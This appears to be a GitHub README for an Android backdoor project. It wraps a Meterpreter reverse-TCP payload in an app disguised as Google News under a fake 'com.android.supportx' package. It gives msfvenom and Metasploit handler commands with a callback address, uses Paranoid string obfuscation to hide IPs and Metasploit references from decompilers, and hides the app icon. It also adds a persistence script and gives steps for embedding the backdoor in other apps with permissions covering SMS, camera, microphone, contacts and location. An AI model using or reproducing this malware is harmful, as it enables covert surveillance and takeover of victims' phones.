
# msfvenom-backdoor-android
This Android Studio project represents an alternative to automatically embedding Meterpreter in an Android APK through MSFVenom:
```
msfvenom --platform android -p android/meterpreter/reverse_tcp -x [ORIGINAL_APK].apk LHOST=[LHOST] LPORT=[LPORT] -f raw -o [BACKDOORED_APK].apk
```
## Source Code
This project contains the source code of the Android apk backdoor generated in Kali Linux by the following command:
```
$msfvenom -p android/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=[LPORT] R > result.apk
```
In order to avoid an early Meterpreter session death:
```
[*] Meterpreter session x closed - Reason:died
```
it starts the payload in a Service. Meterpreter session is more stable in this way, instead the original MSFVenom apk often causes session to die very soon.

In this project the backdoor works in **LAN** environment, opening a TCP meterpreter session to 192.168.111.168 on port 8080, but both the address and protocol settings can be easily changed in **Payload.java** file if you want to work in a **WAN**. In detail, **TCP**, **HTTP** and **HTTPS** communications protocols are all supported.

## Obfuscation
In order obfuscate the malicious code multiple strategies have been adopted:

### 1. Metasploit references removal
The app package *stage.metasploit.com.backdooredapk* has been replaced with a fake Android standard package *com.android.supportx*.

### 2. Name and icon spoofing
In the icon folder all the most common Google services icons have been downloaded and then imported in all sizes (ldpi, mdpi, hdpi, xhdpi, xxhdpi, xxxhdpi and tvdpi) in the app resource folder by Android Studio. In this repo the Google News icon has been applied and in the *strings.xml* file the app name value has been changed to *News*.

### 2. String obfuscation
The string obfuscation has been performed by applying the Paranoid plugin. In order to make Paranoid work with your project you have to apply the Paranoid Gradle plugin to the project. Please notice that the Paranoid plugin must be applied **after** the Android plugin.

```
buildscript {
  repositories {
    jcenter()
  }

  dependencies {
    classpath 'io.michaelrocks:paranoid-gradle-plugin:0.3.2'
  }
}

apply plugin: 'com.android.application'
apply plugin: 'io.michaelrocks.paranoid'
```
The ***Payload*** and ***PayloadTrustManager*** classes have then been marked by the `@Obfuscate` so, after the project compiles, every string in annotated classes has been obfuscated. In this way if someone tries to unpack the apk:
```
apktool d [NAME].apk
```
or even completely decompule it:
```
jadx-gui
```
he will not be able to identify any malicious strings, such as IPs, ports, protocols, Metasploit references, or even suspect class names.

## Metasploit Handler
The control server must be executing handler exploit with Metasploit, with following commands:
```
$ msfconsole
$ use exploit/multi/handler
$ set payload android/meterpreter/reverse_tcp
$ set LHOST [LHOST]
$ set LPORT [LPORT]
$ set ExitOnSession false
$ set AndroidWakelock true 
$ set AndroidHideAppIcon true # OPTIONAL
$ set AutoRunScript commands.rc
$ exploit -j -z
```
or by simply using the *handler.rc* script:
```
$ msfconsole -r ./scripts/handler.rc
```
As soon as the Metasploit handler is ready, the apk can be installed and launched.

## Post-exploitation
The *AutoRunScript* option has been set to automatically execute the *commands.rc* script, once Metasploit receives the connection back. The *android.sh* bash script is uploaded and, if launched, adds persistence by calling back a new Meterpreter sessions every ***X*** seconds. 

## How to embed this backdoor?
The proposed backdoor can be easily embedded in other Android Studio apps by following these steps:
1. Import the Java class files into the project. Be careful to correctly write the new app package into these classes and to manage all the imports.
2. Add the Paranoid plugin to the project
3. Add all the required permissions to the *AndroidManifest.xml* file:
```
<uses-permission android:name="android.permission.INTERNET" />  
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />  
<uses-permission android:name="android.permission.ACCESS_COURSE_LOCATION" />  
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />  
<uses-permission android:name="android.permission.READ_PHONE_STATE" />  
<uses-permission android:name="android.permission.SEND_SMS" />  
<uses-permission android:name="android.permission.RECEIVE_SMS" />  
<uses-permission android:name="android.permission.RECORD_AUDIO" />  
<uses-permission android:name="android.permission.CALL_PHONE" />  
<uses-permission android:name="android.permission.READ_CONTACTS" />  
<uses-permission android:name="android.permission.WRITE_CONTACTS" />  
<uses-permission android:name="android.permission.RECORD_AUDIO" />  
<uses-permission android:name="android.permission.WRITE_SETTINGS" />  
<uses-permission android:name="android.permission.CAMERA" />  
<uses-permission android:name="android.permission.READ_SMS" />  
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>  
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>  
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>  
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>  
<uses-permission android:name="android.permission.SET_WALLPAPER"/>  
<uses-permission android:name="android.permission.READ_CALL_LOG"/>  
<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>  
<uses-feature android:name="android.hardware.camera"/>  
<uses-feature android:name="android.hardware.camera.autofocus"/>  
<uses-feature android:name="android.hardware.microphone"/>
```
4. Add the ***Svc*** service to the *AndroidManifest.xml* file:
```
<service  
  android:name="com.android.supportx.Svc"  
  android:enabled="true"  
  android:exported="false"  
  android:process=":myintent" >  
</service>
```
and properly fix the app package (replacing *com.android.supportx*).

## References
1. [GitHub repository for Android MSFVenom Backdoor](https://github.com/giovannicolonna/msfvenom-backdoor-android)
2. [Paranoid plugin for string obfuscation in Android applications](https://github.com/MichaelRocks/paranoid)
3. [Create a Persistent Back Door in Android Using Kali Linux](https://null-byte.wonderhowto.com/how-to/create-persistent-back-door-android-using-kali-linux-0161280/)
4. [Android ISO images for virtualization](https://www.fosshub.com/Android-x86.html)

## Other resources
1. [BlackHat Art of Backdooring Android apk](https://medium.com/@lucideus/the-black-hat-art-of-backdooring-android-apk-part-1-lucideus-research-7215f79e7d51)
2. [Manually embed Meterpreter in Android apk](https://www.blackhillsinfosec.com/embedding-meterpreter-in-android-apk/)
3. [AhMyth Android Rat](https://github.com/AhMyth/AhMyth-Android-RAT)
4. [Obfuscapk - A black-box obfuscation tool for Android apps](https://github.com/ClaudiuGeorgiu/Obfuscapk)
5. [Evil-Droid Framework](https://github.com/M4sc3r4n0/Evil-Droid)
6. [TheFatRat](https://github.com/Screetsec/TheFatRat)
7. [How To Automatically Embed Payloads In APK's - Evil-Droid, Thefatrat & Apkinjector](https://www.youtube.com/watch?v=C_Og6LnEZSg)
8. [Apkwash - Android APK Antivirus evasion for msfvenom generated payloads](https://github.com/jbreed/apkwash)
9. [Apksigner - Sign and verify Android APKs](http://manpages.ubuntu.com/manpages/bionic/man1/apksigner.1.html)
10. [Backdoor-apk](https://github.com/dana-at-cp/backdoor-apk)

